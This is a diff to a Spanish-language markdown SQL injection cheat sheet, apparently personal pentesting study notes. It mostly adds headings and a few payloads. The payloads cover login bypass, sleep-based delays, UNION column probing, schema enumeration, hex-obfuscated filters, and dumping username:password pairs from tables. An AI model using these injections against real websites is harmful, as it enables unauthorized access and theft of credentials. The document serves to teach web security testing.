@@ -30,23 +30,23 @@ A continuación, se proporciona el enlace a la utilidad online de ‘**ExtendsCl
 -   **ExtendsClass MySQL Online**: [https://extendsclass.com/mysql-online.html](https://extendsclass.com/mysql-online.html)
 
 
-## Comandos 
+## Conforma una DB
 
 Tenemos: **DB > TABLAS > COLUMNAS > DATOS**
-**Antes de la primer coma debemos de colocar un valor que no exista en la DB. Asi lo que inyectemos se podra visualizar.**
+**Antes de la primer coma debemos de colocar un valor que no exista en la DB. Así lo que inyectemos se podrá visualizar.**
 
 * [Cheat-Sheet-SQLI](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 
-## Inyecciones mirando el error en el Output
+## Inyecciones UNION 'mirando el error en el Output de la Web'
 
 Debemos de adivinar cuantas columnas existen. Esperando a que ya no nos muestre el **error**.
 * La mayoría de las inyecciones las puedes hacer empezando por  '
-* Dependiendo de la web podemos iniciar con comilla y a veces no, cuando es el caso también no es necesario colocar el comentario -- - al final de la query.
+* Dependiendo de la web podemos iniciar con camilla y a veces no, cuando es el caso también no es necesario colocar el comentario -- - al final de la query.
 * Un indicio de inyección SQL es encontrar en la url **.php?id=** No es necesario que diga **id** también puede tener otro parámetro. 
 
 ```bash
 ❯ ' or '1'='1                                         # La mas sencilla y nos devolveria un true, dejamos una comilla sin cerrar ya que la propia query la cerrara
-❯ ' or 1=1-- -                                        # La mas sencilla y nos devolveria un true, aveces hace bypass en el panel de autenticacion 
+❯ ' or 1=1-- -                                        # La mas sencilla y nos devolveria un true, aveces hace bypass en el panel de autenticacion, pero devuelve todo en la bvase de datos cuando no se utiliza en el panel de login
 ❯ <user>'-- -                                         # Este se usa en un panel de login 
 ❯ ' or sleep(5)-- -                                   # Haremos que tarde en responder la web 5 segundos
 ❯ ' and sleep(5)-- -                                  # Haremos que tarde en responder la web 5 segundos
@@ -54,20 +54,20 @@ Debemos de adivinar cuantas columnas existen. Esperando a que ya no nos muestre 
 ❯ ' and if()-- a                                      
 ```
 
-Después de saber cuantas columnas existen podemos usar Union Select para meter un data en ese columna, esperando a que también esa columna acepte datos. Aquí tendríamos un ejemplo de que existen 3 columnas. Pero pueden ser mas o menos, dependiendo la DB.
+## Para saber el numero de columnas.
 ```bash
 ❯ ' union select 1,2,3 -- -                           # Primero colocamos eso y buscamos cual es el numero que nos pone en el output de la web, ya que es en esa columna en donde podremos inyectar algo
 ❯ ' union select NULL,NULL,NULL -- -                  # Aveces solo acepta NULL en lugar de numeros
 ❯ ' union select "test",NULL,NULL -- -                # Podemos colocar texto 
-❯ ' union select database(),NULL,NULL -- -            # Queremos que muestre el nombre de la base de datos actual en uso
+❯ ' union select database(),NULL,user() -- -          # Queremos que muestre el nombre de la base de datos actual en uso, tambien podemos ver al usuario quien corre la base de datos
+
+❯ ' union select NULL,@@version-- -                   # Mirar la version de MySQL y Microsoft
 
 ❯ ' union select NULL,NULL from dual-- -              # Dual es una tabla existente en Oracle
 ❯ ' union select NULL,banner from v$version-- -       # Mirar la version en Oracle
-
-❯ ' union select NULL,@@version-- -                   # Mirar la version de MySQL y Microsoft
 ```
 
-Para saber las bases de datos (DB) existentes.
+### Para saber las bases de datos (DB) existentes.
 ```bash 
 ❯ ' union select schema_name from information_schema.schemata-- -                    # Nos muestra todas las bases de datos existentes  
 ❯ ' union select schema_name from information_schema.schemata limit 0,1-- -          # Nos muestra la primer base de datos existente, la cual podemos ir variando, limitando a 1 resultado, el que varia es el 0 a 1,2,3, etc...
@@ -75,7 +75,7 @@ Para saber las bases de datos (DB) existentes.
 
 ```
 
-Para saber las tablas de la base de datos (DB) especifica.
+### Para saber las tablas de la base de datos (DB) especifica.
 ```bash
 ❯ ' union select table_name from information_schema.tables where table_schema='❮DB_Name❯'-- -                    # Nos muestra las tablas existentes
 ❯ ' union select group_concat(table_name) from information_schema.tables where table_schema='❮DB_Name❯'-- -      # Nos muestra las tablas existentes, pero separadas por comas
@@ -86,7 +86,7 @@ Para saber las tablas de la base de datos (DB) especifica.
 ❯ ' union select table_name from all_tables where owner='❮owner_Name❯'-- -
 ```
 
-Para saber las columnas de la tabla que encontramos y la base de datos  (DB) especifica.
+### Para saber las columnas de la tabla que encontramos y la base de datos  (DB) especifica.
 ```bash 
 ❯ ' union select column_name from information_schema.columns where table_schema='❮DB_Name❯' and table_name='❮Table_Name❯'-- -                    # Nos muestra las tablas existentes
 ❯ ' union select column_name from information_schema.columns where table_schema='❮DB_Name❯' and table_name='❮Table_Name❯' limit 0,1-- -          # Nos muestra las tablas existentes, pero limita a 1 resultado, el que varia es el 0 a 1,2,3, etc...
@@ -95,9 +95,9 @@ Para saber las columnas de la tabla que encontramos y la base de datos  (DB) esp
 ❯ ' union select column_name from all_tab_columns where table_name='❮Table_Name❯'                      # Mostrar las columnas en Oracle 
 ```
 
-Para que nos muestre los datos de las columnas.
+### Para que nos muestre los datos de las columnas.
 ```bash
-❯ ' union select group_concat(username) from ❮DB_Name❯.❮Table_Name❯-- -          # Especificamos la DB y la tabla, si la DB no es la que esta en uso y nos muestra los datos
+❯ ' union select group_concat(username) from ❮DB_Name❯.❮Table_Name❯-- -          # Especificamos la DB y la tabla, esto si la DB no es la que esta en uso y solo asi podemos ver los datos que queremos
 ❯ ' union select group_concat(username) from ❮Table_Name❯-- -                    # Para que nos muestre los datos, aqui asumimos que la base de datos es la que esta en uso 
 ❯ ' union select group_concat(username,':',password) from ❮Table_Name❯-- -       # Para que nos muestre los datos de los usuarios y su passwd separados por : 
 ❯ ' union select username||':'||password from ❮Table_Name❯-- -                   # Para que nos muestre los datos de los usuarios y su passwd separados por : 
@@ -105,12 +105,17 @@ Para que nos muestre los datos de las columnas.
 
 	 # Debemos de colocar los caracteres en Hexadecimal para evitar fallos
 	 # : = 0x3a (Hex) 
+
+❯ ' union select NULL,password from ❮Table_Name❯ where username = '0x61646d696e' -- -  # Podemos ofuscar (ocultar) la data, ya que muchas veces existe una sanitizacion que no permite ingresar cadenas de texto
+	# 0x61646d696e (Hex) = admin 
+
+❯ ' union select NULL,concat(username,':',password) from ❮Table_Name❯-- -         # Otra forma de agrupar los datos 
 ```
+
 
 ## Inyecciones Blind con respuesta condicional 
 
 ```bash 
-
 ❯ ' and substr((Consulta)Inicio,longitud))=''                                                   # Forma de usar el substr
 	# Longitud = Los caracteres que vamos a extraer
 	# Inicio = Es la posicion inicial del caracter a comparar 
@@ -180,7 +185,7 @@ if __name__ == '__main__':
 ```
 
 
-* **SQL Time**: Parra este caso debemos de hacer el Script en Python3
+## SQL Time: Para este caso debemos de hacer el Script en Python3
 ```python 
 #!/usr/bin/python3
 
